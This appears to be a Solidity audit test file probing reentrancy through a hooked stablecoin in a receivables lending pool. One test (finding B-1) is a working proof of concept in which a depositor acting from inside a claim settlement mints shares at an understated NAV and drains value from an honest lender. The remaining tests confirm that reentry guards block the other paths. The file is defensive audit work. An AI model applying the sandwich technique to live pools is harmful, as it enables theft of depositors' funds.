// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import {IClaimRegistry} from "../../src/interfaces/IClaimRegistry.sol";
import {IReceivablesPool} from "../../src/interfaces/IReceivablesPool.sol";
import {ClaimState, RecipientType} from "../../src/libraries/ClaimTypes.sol";
import {HookedBaseTest} from "./mocks/HookedBaseTest.sol";
import {HookActor} from "./mocks/HookActor.sol";

/// @notice Workstream B1: reentry through a frxUSD with transfer hooks (what U-31 assumes frxUSD does not have).
/// Every test deploys the whole system over `HookedToken`.
contract ReentrancyTest is HookedBaseTest {
    uint128 internal constant PRICE = 2500e18;

    HookActor internal actor;

    function setUp() public override {
        super.setUp();
        actor = new HookActor();
        vm.label(address(actor), "HookActor");
    }

    function _allow(address who) internal {
        vm.prank(admin);
        pool.setLenderAllowed(who, true);
    }

    /// @dev Gives the actor frxUSD and approves the registry and the pool to pull it.
    function _fundActor(uint256 amount) internal {
        frxUSD.mint(address(actor), amount);
        actor.exec(address(frxUSD), abi.encodeCall(IERC20.approve, (address(registry), type(uint256).max)));
        actor.exec(address(frxUSD), abi.encodeCall(IERC20.approve, (address(pool), type(uint256).max)));
    }

    /// @dev Runs the B1 sandwich: the actor settles `claimId` in full and, from its own sender hook, deposits
    /// `deposit` into the pool. Returns what the actor's new shares are worth right after.
    function _settleWithHookedDeposit(uint256 claimId, uint256 deposit, bool hookAfter)
        internal
        returns (uint256 shares, uint256 value)
    {
        _allow(address(actor));
        _fundActor(PRICE + deposit);
        hooked.setSenderHookAfter(hookAfter);
        hooked.setSenderHook(address(actor), address(actor));
        actor.arm(address(pool), abi.encodeCall(pool.deposit, (deposit, address(actor))));
        actor.exec(address(registry), abi.encodeCall(IClaimRegistry.settle, (claimId, PRICE)));
        assertEq(actor.hookRuns(), 1, "the hook ran once");
        assertTrue(actor.hookSucceeded(), "the deposit inside the settle went through");
        shares = pool.balanceOf(address(actor));
        value = pool.previewRedeem(shares);
    }

    /// @dev FINDING B-1: with a sender-hook token, a lender who deposits from inside `settle` (after
    /// `recordPrincipalReturned`, before the payment lands) mints at a NAV understated by the principal portion.
    /// @notice Hypothesis: a deposit made from inside a settlement cannot be worth more than what was deposited.
    function test_settle_documentsHookedDepositAtUnderstatedNav() public {
        _seedPool(SEED);
        uint256 id = _funded(PRICE);
        uint256 victimBefore = pool.previewRedeem(pool.balanceOf(lender));
        uint256 deposit = 30_000e18;

        (uint256 shares, uint256 value) = _settleWithHookedDeposit(id, deposit, false);
        uint256 victimAfter = pool.previewRedeem(pool.balanceOf(lender));

        // the actor exits in full and keeps the difference
        uint256 balBefore = frxUSD.balanceOf(address(actor));
        actor.exec(address(pool), abi.encodeCall(pool.redeem, (shares, address(actor), address(actor))));
        uint256 redeemed = frxUSD.balanceOf(address(actor)) - balBefore;

        emit log_named_uint("deposit (wei)", deposit);
        emit log_named_uint("value right after settle (wei)", value);
        emit log_named_uint("redeemed (wei)", redeemed);
        emit log_named_uint("attacker gain (wei)", redeemed - deposit);
        emit log_named_uint("victim value before settle (wei)", victimBefore);
        emit log_named_uint("victim value after settle (wei)", victimAfter);
        // the honest lender should have gained nothing from a principal settlement (NAV-neutral); it lost instead
        assertGt(redeemed, deposit + 1000e18, "the attacker extracts more than 1,000 frxUSD");
        assertLt(victimAfter + 1000e18, victimBefore, "the honest lender pays for it");
        // the deposit buys deposit / (A0 - P + deposit) of the pool, which then gets P back
        uint256 expected = deposit * PRICE / (SEED - PRICE + deposit);
        assertApproxEqAbs(redeemed - deposit, expected, 1e6, "gain = deposit * P / (assets - P + deposit)");
        assertEq(uint8(_state(id)), uint8(ClaimState.Settled));
    }

    /// @notice Hypothesis: the same deposit made from a sender hook that runs after balances move is fair.
    function test_settle_hookAfterBalanceMoveMintsAtFairNav() public {
        _seedPool(SEED);
        uint256 id = _funded(PRICE);
        uint256 victimBefore = pool.previewRedeem(pool.balanceOf(lender));
        uint256 deposit = 30_000e18;
        (, uint256 value) = _settleWithHookedDeposit(id, deposit, true);
        assertLe(value, deposit + 1, "no gain beyond rounding");
        assertGe(pool.previewRedeem(pool.balanceOf(lender)) + 1, victimBefore, "the honest lender keeps its value");
    }

    /// @notice Hypothesis (control): a deposit right after a hooked settlement completes is fair.
    function test_settle_depositAfterSettlementIsFair() public {
        _seedPool(SEED);
        uint256 id = _funded(PRICE);
        _allow(address(actor));
        _fundActor(PRICE + 30_000e18);
        hooked.setSenderHook(address(actor), address(actor)); // installed but not armed
        actor.exec(address(registry), abi.encodeCall(IClaimRegistry.settle, (id, PRICE)));
        actor.exec(address(pool), abi.encodeCall(pool.deposit, (30_000e18, address(actor))));
        assertLe(pool.previewRedeem(pool.balanceOf(address(actor))), 30_000e18);
    }

    /// @notice Hypothesis: settle cannot be reentered from the payer's hook (registry guard).
    function test_settle_reentryFromPayerHookReverts() public {
        _seedPool(SEED);
        uint256 id = _funded(PRICE);
        _fundActor(2 * PRICE);
        hooked.setSenderHook(address(actor), address(actor));
        actor.arm(address(registry), abi.encodeCall(IClaimRegistry.settle, (id, 1)));
        actor.exec(address(registry), abi.encodeCall(IClaimRegistry.settle, (id, PRICE)));
        assertEq(actor.hookError(), ReentrancyGuard.ReentrancyGuardReentrantCall.selector);
        assertEq(_claim(id).amountPaid, PRICE, "only the outer payment landed");
    }

    /// @dev Takes a claim for the actor as recipient to `Approved`.
    function _actorApproved(uint128 amount) internal returns (uint256 id) {
        id = _submitWith(address(actor), _params(orgId, RecipientType.Member, guarantor, amount, amount), guarantorKey);
        _approve(id, amount);
    }

    /// @notice Hypothesis: a claimant cannot reenter purchaseClaim from the payout of fundPurchase.
    function test_purchaseClaim_reentryFromFundPurchasePayoutReverts() public {
        _seedPool(SEED);
        uint256 first = _actorApproved(PRICE);
        uint256 second = _actorApproved(PRICE);
        hooked.setReceiverHook(address(actor), address(actor));
        actor.arm(address(registry), abi.encodeCall(IClaimRegistry.purchaseClaim, (second)));
        actor.exec(address(registry), abi.encodeCall(IClaimRegistry.purchaseClaim, (first)));
        assertEq(actor.hookError(), ReentrancyGuard.ReentrancyGuardReentrantCall.selector);
        assertEq(uint8(_state(first)), uint8(ClaimState.Funded));
        assertEq(uint8(_state(second)), uint8(ClaimState.Approved));
        assertEq(pool.outstandingPrincipal(), PRICE);
    }

    /// @notice Hypothesis: a claimant who is also a lender cannot deposit from the payout of fundPurchase, while
    /// the pool's NAV counts the principal before the cash has left.
    function test_fundPurchase_depositFromPayoutHookReverts() public {
        _seedPool(SEED);
        _allow(address(actor));
        _fundActor(10_000e18);
        uint256 id = _actorApproved(PRICE);
        hooked.setReceiverHook(address(actor), address(actor));
        actor.arm(address(pool), abi.encodeCall(pool.deposit, (10_000e18, address(actor))));
        actor.exec(address(registry), abi.encodeCall(IClaimRegistry.purchaseClaim, (id)));
        assertEq(actor.hookError(), ReentrancyGuard.ReentrancyGuardReentrantCall.selector);
        assertEq(pool.balanceOf(address(actor)), 0);
    }

    /// @notice Hypothesis: a lender cannot reenter deposit from the payout of withdraw or redeem.
    function test_withdraw_reentryIntoDepositFromPayoutHookReverts() public {
        _allow(address(actor));
        _fundActor(SEED);
        actor.exec(address(pool), abi.encodeCall(pool.deposit, (SEED, address(actor))));
        hooked.setReceiverHook(address(actor), address(actor));

        actor.arm(address(pool), abi.encodeCall(pool.deposit, (1e18, address(actor))));
        actor.exec(address(pool), abi.encodeCall(pool.withdraw, (1000e18, address(actor), address(actor))));
        assertEq(actor.hookError(), ReentrancyGuard.ReentrancyGuardReentrantCall.selector, "withdraw -> deposit");

        uint256 shares = pool.balanceOf(address(actor)) / 2;
        actor.arm(address(pool), abi.encodeCall(pool.redeem, (1e18, address(actor), address(actor))));
        actor.exec(address(pool), abi.encodeCall(pool.redeem, (shares, address(actor), address(actor))));
        assertEq(actor.hookError(), ReentrancyGuard.ReentrancyGuardReentrantCall.selector, "redeem -> redeem");
    }

    /// @notice Hypothesis: emergencyWithdraw cannot be reentered from the receiver's hook in the full system.
    function test_emergencyWithdraw_reentryFromReceiverHookReverts() public {
        _seedPool(SEED);
        _funded(PRICE);
        uint256 half = pool.balanceOf(lender) / 2;
        vm.prank(lender);
        pool.transfer(address(actor), half);
        vm.prank(admin);
        pool.activateEmergencyMode();
        hooked.setReceiverHook(address(actor), address(actor));
        actor.arm(address(pool), abi.encodeCall(IReceivablesPool.emergencyWithdraw, (address(actor))));
        uint256 entitled = pool.maxEmergencyWithdraw(address(actor));
        actor.exec(address(pool), abi.encodeCall(IReceivablesPool.emergencyWithdraw, (address(actor))));
        assertEq(actor.hookError(), ReentrancyGuard.ReentrancyGuardReentrantCall.selector);
        assertEq(frxUSD.balanceOf(address(actor)), entitled, "paid once");
        assertEq(pool.maxEmergencyWithdraw(address(actor)), 0);
    }
}
